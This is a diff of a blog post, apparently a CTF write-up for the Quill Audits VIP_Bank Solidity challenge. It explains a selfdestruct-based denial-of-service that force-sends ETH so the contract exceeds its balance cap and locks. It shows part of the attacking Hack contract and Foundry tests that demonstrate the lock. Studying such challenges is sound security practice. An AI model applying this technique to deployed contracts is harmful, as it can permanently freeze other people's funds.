@@ -5,13 +5,13 @@ tags: [CTF]
 title: "Day06 - VIP_Bank"
 ---
 
-Recently I discovered on Twitter [this](https://academy.quillaudits.com/challenges) challenges page from Quill Audits, and I decided to give it a try. I started with the VIPBank challenge, which is a smart contract that allows you to deposit and withdraw funds from it. The challenge consists on locking the contract, aka DoS attack.
+Recently I discovered on Twitter [this](https://academy.quillaudits.com/challenges) challenges page from Quill Audits, and I decided to give it a try.
+
+I started with the VIPBank challenge, which is a smart contract that allows you to deposit and withdraw funds from it. The challenge consists on locking the contract, aka DoS attack.
 
 # The contract
 
 ```javascript
-// SPDX-License-Identifier: MIT
-
 pragma solidity 0.8.7;
 
 contract VIP_Bank{
@@ -63,19 +63,13 @@ contract VIP_Bank{
 
 DoS attacks *(at least the ones I've seen for now)* are always based in the same principle, which is using the `selfdestruct()` method on an attack contract, which will force send all the funds to the victim contract even though this one won't accept incoming funds.
 
-```javascript
-// SPDX-License-Identifier: MIT
+In this case, just by sending more than `maxETH` to the `VIP_Bank` contract, we will be able to lock it.
 
+```javascript
 pragma solidity 0.8.7;
 
-import "./VIPBank.sol";
-
 contract Hack {
-    VIP_Bank public vipBank;
-
-    constructor() {
-        vipBank = new VIP_Bank();
-    }
+    constructor() {}
 
     receive() external payable {}
 
@@ -91,9 +85,11 @@ This is really the meat of this challenge for me, as I want to practice using th
 
 We will write some tests that will prove that the `VIP_Bank` contract is in fact working properly and also show that once we use our `Hack` contract to perform the DoS attack, the contract will be locked.
 
-```javascript
-// SPDX-License-Identifier: MIT
+### Tests initial setup
 
+Pretty standard stuff when using `foundry`, we create a new instance of the `VIP_Bank` contract and the `Hack` contract and use the `setUp()` function which is called before each test.
+
+```javascript
 pragma solidity 0.8.7;
 
 import "../src/VIPBank.sol";
@@ -110,30 +106,44 @@ contract TestVIPBank is Test {
         hack = new Hack();
     }
 ```
-```javascript
-    function test_canWithdraw() public {
-        vipBank.addVIP(address(1));
-        vm.deal(address(1), 0.1 ether);
 
-        vm.startPrank(address(1));
-        vipBank.deposit{value: 0.05 ether}();
-        vipBank.withdraw(0.05 ether);
-        vm.stopPrank();
-    }
-```
-```javascript
-    function testFail_cannnotWithdraw() public {
-        vipBank.addVIP(address(1));
-        vm.deal(address(hack), 0.1 ether);
-        vm.deal(address(1), 0.6 ether);
+### Test correct functionality
 
-        vm.startPrank(address(1));
-        for (uint256 i = 0; i < 10; i++) {
-            vipBank.deposit{value: 0.05 ether}();
-        }
-        hack.hack(address(vipBank));
-        vipBank.withdraw(0.05 ether);
-        vm.stopPrank();
-    }
+This is the test that will ensure that the contract is functional and does what it is suposed to do.
+
+```javascript
+function test_canWithdraw() public {
+    vipBank.addVIP(address(1));
+    vm.deal(address(1), 0.1 ether);
+
+    vm.startPrank(address(1));
+    vipBank.deposit{value: 0.05 ether}();
+    vipBank.withdraw(0.05 ether);
+    vm.stopPrank();
 }
 ```
+
+### Test DoS attack
+
+And this one will show that the contract is locked after we call our `Hack` contract.
+
+```javascript
+function testFail_cannnotWithdraw() public {
+    vipBank.addVIP(address(1));
+    vm.deal(address(hack), 0.1 ether);
+    vm.deal(address(1), 0.6 ether);
+
+    vm.startPrank(address(1));
+    for (uint256 i = 0; i < 10; i++) {
+        vipBank.deposit{value: 0.05 ether}();
+    }
+    hack.hack(address(vipBank));
+    vipBank.withdraw(0.05 ether);
+    vm.stopPrank();
+}
+```
+Ideally we should simulate this test without giving `address(1)` VIP status, but it doesn't really matter, anyone could run the `hack()` function on the `Attack` contract.
+
+## Wrapping up
+
+As I'm still learning `foundry` this is the way I found to do it, but I'm sure there is a better way, if you know it, please let me know by hitting a DM [@mariodev__](https://twitter.com/mariodev__) on Twitter.
